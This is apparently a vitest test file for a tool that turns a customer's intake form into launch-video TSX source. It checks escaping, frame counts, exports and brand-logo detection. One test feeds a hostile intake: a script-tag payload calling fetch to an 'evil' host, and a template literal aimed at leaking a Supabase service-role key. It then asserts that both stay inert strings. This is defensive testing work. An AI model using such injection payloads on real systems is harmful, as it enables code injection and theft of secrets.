import { describe, it, expect } from "vitest";
import ts from "typescript";
import { readFileSync } from "node:fs";
import { join } from "node:path";
import { intakeToFilmContent, buildThemeFilmSource } from "../theme-film";
import { filmFrames, BEAT, JOURNEY_FRAMES } from "../theme-film-types";

const INTAKE = {
  product_name: "Tartine",
  one_liner: "A bakery in San Francisco.",
  problem: "You wait and hope it is still warm.",
  features: [
    { title: "Country loaf", detail: "Baked through the night." },
    { title: "Morning bun", detail: "Out at seven." },
    { title: "Pre-order", detail: "Reserve the night before." },
  ],
  metrics: [{ stat: "7am", label: "Out of the oven" }],
  coverage: { regions: ["Mission", "Berkeley"] },
  product_surface: { header: { title: "Order" }, items: [{ title: "Pick a loaf", chips: ["Today", "Tomorrow"] }] },
  cta_text: "Order",
  cta_url: "https://tartinebakery.com/",
};

describe("a customer's words are DATA in a film we own", () => {
  it("never lets visitor text out of a JSON string literal", () => {
    const hostile = {
      ...INTAKE,
      product_name: "</script><script>fetch('http://evil')</script>",
      one_liner: "`${process.env.SUPABASE_SERVICE_ROLE_KEY}`",
    };
    const src = buildThemeFilmSource(intakeToFilmContent(hostile));
    const sf = ts.createSourceFile("Authored.tsx", src, ts.ScriptTarget.ES2020, true, ts.ScriptKind.TSX);
    expect((sf as unknown as { parseDiagnostics?: unknown[] }).parseDiagnostics ?? []).toHaveLength(0);

    const literals: string[] = [];
    const walk = (n: ts.Node): void => {
      if (ts.isStringLiteral(n)) literals.push(n.text);
      n.forEachChild(walk);
    };
    walk(sf);
    expect(literals.some((l) => l.includes("<script>"))).toBe(true);
    expect(literals.some((l) => l.includes("SUPABASE_SERVICE_ROLE_KEY"))).toBe(true);
    const calls: string[] = [];
    const walkCalls = (n: ts.Node): void => {
      if (ts.isCallExpression(n)) calls.push(n.expression.getText(sf));
      n.forEachChild(walkCalls);
    };
    walkCalls(sf);
    expect(calls).toEqual(["filmFrames"]);
  });

  it("drops a region list of one, which the film would render as a lonely word", () => {
    const one = intakeToFilmContent({ ...INTAKE, coverage: { regions: ["Mission"] } });
    expect(one.regions).toBeUndefined();
  });

  it("invents nothing when the intake is empty", () => {
    const bare = intakeToFilmContent({ product_name: "X", one_liner: "Y", features: [] });
    expect(bare.metrics).toBeUndefined();
    expect(bare.regions).toBeUndefined();
    expect(bare.surface).toBeUndefined();
    expect(bare.features).toEqual([]);
  });
});

describe("the frame arithmetic mirrors the film", () => {
  it("adds up from the film's own beat counts", () => {
    const c = intakeToFilmContent(INTAKE);
    expect(filmFrames(c) / 30).toBeGreaterThanOrEqual(45);
  });

  it("stays in sync with planShots in the film itself", () => {
    const film = readFileSync(
      join(__dirname, "../../../../../../packages/launch-video/src/themes/swiss-kinetic.tsx"),
      "utf8",
    );
    for (const beats of [9, 8, 10, 7]) expect(film).toContain(`BEAT * ${beats}`);
  });
});

describe("the generated file satisfies the engine's import", () => {
  it("exports exactly the names LaunchVideo.tsx imports", () => {
    const engine = readFileSync(
      join(__dirname, "../../../../../../packages/launch-video/src/LaunchVideo.tsx"),
      "utf8",
    );
    const importLine = /import\s*\{([^}]+)\}\s*from\s*'\.\/Authored'/.exec(engine);
    expect(importLine, "engine no longer imports from './Authored'").toBeTruthy();
    const required = (importLine?.[1] ?? "").split(",").map((n) => n.trim()).filter(Boolean);
    expect(required.length).toBeGreaterThan(0);

    const src = buildThemeFilmSource(intakeToFilmContent(INTAKE));
    for (const name of required) {
      expect(src, `generated film must export ${name}`).toMatch(
        new RegExp(`export\\s+const\\s+${name}\\b`),
      );
    }
  });
});

describe("the film we hand back clears the floor the door promises", () => {
  it("makes at least 45 seconds from material the door accepted", () => {
    const rich = intakeToFilmContent({
      ...INTAKE,
      features: Array.from({ length: 8 }, (_, i) => ({ title: `Thing ${i}`, detail: "Detail." })),
    });
    expect(filmFrames(rich) / 30).toBeGreaterThanOrEqual(45);
    const thin = intakeToFilmContent({ product_name: "X", one_liner: "Y", features: [], cta_text: "Go", cta_url: "https://x.com" });
    expect(filmFrames(thin) / 30).toBeGreaterThanOrEqual(45);
  });
});

describe("a logo appears only because the customer named it", () => {
  it("finds a mark the product's own capabilities mention", () => {
    const c = intakeToFilmContent({
      ...INTAKE,
      features: [{ title: "Pay with Stripe", detail: "Checkout runs on Stripe payments." }],
    });
    expect((c.marks ?? []).map((m) => m.title)).toContain("Stripe");
    expect((c.marks ?? [])[0]?.src).toMatch(/^data:image\/svg\+xml;base64,/);
  });

  it("adds nothing when the customer named nothing", () => {
    expect(intakeToFilmContent(INTAKE).marks).toBeUndefined();
  });

  it("does not fire on a word that merely contains a brand name", () => {
    const c = intakeToFilmContent({
      ...INTAKE,
      features: [{ title: "Pinstripes and tailoring", detail: "We sell pinstripe suits." }],
    });
    expect(c.marks).toBeUndefined();
  });
});

describe("an ordinary English word is not a trademark", () => {
  it("does not put a payment logo on a clothing product", () => {
    const c = intakeToFilmContent({
      ...INTAKE,
      features: [{ title: "Stripe or solid", detail: "Choose a stripe or a solid pattern." }],
    });
    expect(c.marks).toBeUndefined();
  });

  it("still finds it when the customer says they take payments with it", () => {
    const c = intakeToFilmContent({
      ...INTAKE,
      features: [{ title: "Checkout", detail: "You pay with Stripe at the door." }],
    });
    expect((c.marks ?? []).map((m) => m.title)).toContain("Stripe");
  });
});

describe("the IN USE film's frame count mirrors the film's own plan", () => {
  const PKG = join(__dirname, "../../../../../../packages/launch-video");
  const load = (f: string) => JSON.parse(readFileSync(join(PKG, "examples", f), "utf8"));

  it("agrees with plan.ts on the worked example, the test fixture and a plain intake", async () => {
    const plan = await import(join(PKG, "src/themes/in-use/plan.ts"));
    const plain = intakeToFilmContent(INTAKE, { theme: "in_use" });
    for (const c of [load("bakeoff-d-apna.json"), load("bakeoff-d-fixture.json"), plain]) {
      expect(filmFrames({ ...c, theme: "in_use" })).toBe(plan.inUseFrames(c));
    }
  });

  it("carries the intake's in_use block through as data, and registers the film", () => {
    const apna = load("bakeoff-d-apna.json");
    const c = intakeToFilmContent({ ...INTAKE, in_use: apna.in_use }, { theme: "in_use" });
    expect(c.theme).toBe("in_use");
    expect(c.in_use?.steps).toHaveLength(4);
    expect(buildThemeFilmSource(c)).toContain("./themes/in-use/film");
  });
});

describe("the journey film's length is one constant on both sides", () => {
  it("mirrors JOURNEY_FRAMES in the film", () => {
    const film = readFileSync(
      join(__dirname, "../../../../../../packages/launch-video/src/themes/journey/film.tsx"),
      "utf8",
    );
    expect(film).toContain(`export const JOURNEY_FRAMES = ${JOURNEY_FRAMES};`);
    const c = intakeToFilmContent({ ...INTAKE, journey: [{ kind: "title", kicker: "k", headline: "h" }] }, { theme: "journey" });
    expect(c.theme).toBe("journey");
    expect(c.journey).toHaveLength(1);
    expect(filmFrames(c)).toBe(JOURNEY_FRAMES);
    expect(JOURNEY_FRAMES / 30).toBeGreaterThanOrEqual(45);
  });

  it("keeps only hex colours from the intake", () => {
    const c = intakeToFilmContent({ ...INTAKE, brand: { accent: "#EE6A96", ground: "url(x)" } }, { theme: "journey" });
    expect(c.brand).toEqual({ accent: "#EE6A96", ground: undefined, ink: undefined });
  });
});
